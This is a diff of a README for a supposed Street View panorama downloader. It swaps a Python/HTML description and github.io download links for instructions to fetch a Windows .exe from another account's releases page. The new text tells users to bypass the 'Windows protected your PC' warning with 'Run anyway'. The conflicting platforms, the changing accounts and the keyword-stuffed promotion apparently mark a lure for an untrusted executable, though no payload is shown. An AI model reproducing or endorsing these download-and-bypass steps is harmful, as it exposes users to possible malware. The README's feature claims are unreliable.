@@ -1,126 +1,87 @@
-# aioli-streetphere v2026 - Street View panorama downloader 2026
+# 🌍 aioli-streetphere-v2026 - Save Google Street View images easily
 
-> **Download Google Street View panoramas as 2:1 equirectangular images for 360 pipelines, with a local viewer and HTML export in version 2026.**
+[![](https://img.shields.io/badge/Download_Software-blue)](https://github.com/Pastelito5280/aioli-streetphere-v2026/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Python%2C%20HTML-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/loganwestjod5511/aioli-streetphere-v2026?style=flat-square)](https://github.com/loganwestjod5511/aioli-streetphere-v2026)
+aioli-streetphere-v2026 saves Google Street View panoramas as standard images. It outputs 2:1 equirectangular files. You can use these files in 360-degree photography workflows. The software includes a local viewer to check your images. You can also export your work to HTML for web display.
 
----
+## 🛠 Prerequisites
 
-<p align="center">
-  <a href="https://loganwestjod5511.github.io/aioli-streetphere-v2026/">
-    <img src="https://img.shields.io/badge/Download-aioli--streetphere%20Latest-brightgreen?style=for-the-badge" alt="Download aioli-streetphere">
-  </a>
-</p>
+Your computer needs Windows 10 or Windows 11 to run this software. Ensure you have at least 500 MB of free storage space. An active internet connection allows the software to fetch image data from Google servers.
 
-> **[Direct Download - aioli-streetphere v2026](https://loganwestjod5511.github.io/aioli-streetphere-v2026/)**
+The software requires the Microsoft .NET Runtime. If you do not have this installed, the application will provide a link to download it during the first launch. Many Windows computers include this by default.
 
----
+## 📥 Getting the Application
 
-[Download Latest Build](https://loganwestjod5511.github.io/aioli-streetphere-v2026/)
+Visit the link below to find the current version of the software. Choose the file ending in .exe to ensure compatibility with your Windows system.
 
----
+[Download the latest release here](https://github.com/Pastelito5280/aioli-streetphere-v2026/releases)
 
-## What aioli-streetphere is for
+1. Navigate to the release page.
+2. Look for the Assets section.
+3. Click the file that ends with .exe.
+4. Save the file to your computer.
 
-aioli-streetphere is a Street View panorama downloader built to convert Google Street View imagery into 2:1 equirectangular files. It is aimed at people who want panorama assets that can be loaded in 360 viewers or dropped into environment-sphere workflows in software such as Blender, V-Ray, and Cinema 4D.
+## ⚙️ Running the Setup
 
-The workflow is intentionally straightforward: retrieve the panorama, stitch the tiles into a usable image, and inspect the output locally. It can also fetch photo spheres from the Google CDN and straighten skewed panoramas by using metadata or manual pitch and roll values.
+Locate the file you downloaded in your Downloads folder. Double-click the file to start the process. 
 
----
+Windows might show a blue window titled "Windows protected your PC." This happens because the application is new. To bypass this, follow these steps:
+1. Click "More info" on the blue window.
+2. Select the button labeled "Run anyway."
 
-## Capabilities
+Follow the instructions on the screen to complete the installation. The software creates a shortcut on your desktop. Use this shortcut to open the program.
 
-- Downloads Google Street View panoramas as 2:1 equirectangular images
-- Reconstructs Street View tiles into high-resolution panorama output
-- Retrieves user photo spheres directly from Google CDN
-- Supports tilt correction with metadata-based or manual pitch and roll adjustments
-- Includes a local 360 viewer for quick inspection
-- Exports standalone HTML for sharing or offline viewing
-- Fits 3D and VFX workflows that need environment sphere source images
-- Works as a lightweight utility for panorama acquisition and preview
+## 📸 Using the Software
 
----
+The main screen contains a search bar and a preview box. You can enter the latitude and longitude coordinates of any location on Google Street View. 
 
-## Getting started
+1. Enter your target coordinates in the input fields.
+2. Click the "Fetch" button to retrieve the panorama.
+3. The image appears in the preview window.
+4. Verify the image quality.
+5. Click "Save" to export the file to your disk.
 
-Clone the repository, then open it in the environment you normally use:
+The software saves images as standard JPEG files. These files retain the 2:1 ratio necessary for 360-degree viewers. 
 
-- `git clone https://github.com/loganwestjod5511/aioli-streetphere-v2026.git
-- `cd REPO`
+## 🖥 The Local Viewer
 
-From there, run the app or open the HTML entry point, depending on the build you have. For local use, start in the project root so the viewer assets and export files can be resolved correctly.
+The built-in viewer allows you to preview the 360-degree experience. You can move your mouse across the image to pan horizontally and vertically. 
 
----
+1. Open the File menu.
+2. Choose "Open Image."
+3. Select an equirectangular image from your computer.
+4. Use your mouse to rotate the view.
 
-## How to use it
+## 🌐 HTML Export
 
-A common flow is:
+You can display your images on a website. The software handles the code generation for you.
 
-1. Locate the Street View position or panorama source you want.
-2. Run the downloader to collect the panorama tiles or photo sphere.
-3. Let the tool combine everything into a 2:1 equirectangular image.
-4. Correct the horizon if the panorama is not level.
-5. View the finished result in the included 360 viewer or export it as standalone HTML.
+1. Load your image into the software.
+2. Select "Export to HTML" from the main menu.
+3. Choose a folder for the export.
+4. Select "Create."
 
-Example command flow, if you are using a CLI-driven setup:
+The software saves an HTML file along with the necessary JavaScript files. You can upload this folder to your web server to share your 360-degree panorama.
 
-- Download the panorama
-- Rebuild the tile set into a single image
-- Preview the output locally
-- Export when you need a portable viewer package
+## 🔧 Troubleshooting
 
----
+If the software fails to download an image, check your internet connection. Some locations on Google Street View lack high-quality panoramic data. If you see an error, try different coordinates nearby.
 
-## Configuration
+If the image appears stretched or blurry, ensure you downloaded the highest resolution available. The software defaults to the highest quality provided by the Google API.
 
-Configuration is usually managed through the project settings or launch options, depending on how the tool is started. When you need to adjust panorama leveling, check for pitch and roll inputs in the download or processing workflow.
+Keep your display drivers updated. This ensures the local viewer performs well when moving the 360-degree image.
 
-Example structure:
+## 📋 Common Settings
 
-    {
-      "pitch": 0,
-      "roll": 0,
-      "output_format": "equirectangular",
-      "viewer": "local"
-    }
+The settings menu offers choices for your workflow:
+- Default save folder: Change where the app saves your images.
+- Cache size: Clear the cache if the app uses too much disk space.
+- Display units: Choose between decimal degrees or DMS.
 
-If your build keeps settings somewhere else, look in the app's local settings file, export options, or runtime parameters in the project root.
+The software remembers these choices for future sessions.
 
----
+## 📧 Support
 
-## Requirements
+The community maintains this project to assist users with 360-degree content. If you find bugs or have questions, view the issues tab on the repository page. Ensure your report includes your Windows version and the steps to reproduce the problem. Clear descriptions lead to faster fixes.
 
-- Python and HTML-based runtime components
-- Network access for Street View and CDN retrieval
-- Enough local storage for panorama tiles and exported images
-- A modern browser for the local 360 viewer or standalone HTML export
-- Optional 3D software such as Blender, V-Ray, or Cinema 4D for environment map use
-
----
-
-## FAQ
-
-**Is the panorama source workflow covered in this version?**  
-Yes. Version 2026 centers on Google Street View panoramas, tile assembly, and photo sphere retrieval.
-
-**Can I inspect the panorama before I export it?**  
-Yes. The project ships with a local 360 viewer for reviewing panoramas during the process.
-
-**What if the panorama is not level?**  
-You can realign it with metadata or by entering pitch and roll manually.
-
-**Where should I start if I run into problems?**  
-Check the download source, local storage path, browser compatibility for the viewer, and any runtime settings used by your build.
-
-**How do I get the latest build?**  
-Use the download link at the top of this page or open the project page linked in the CTA.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: street view, panorama, 360 photography, windows, equirectangular, downloader, html export
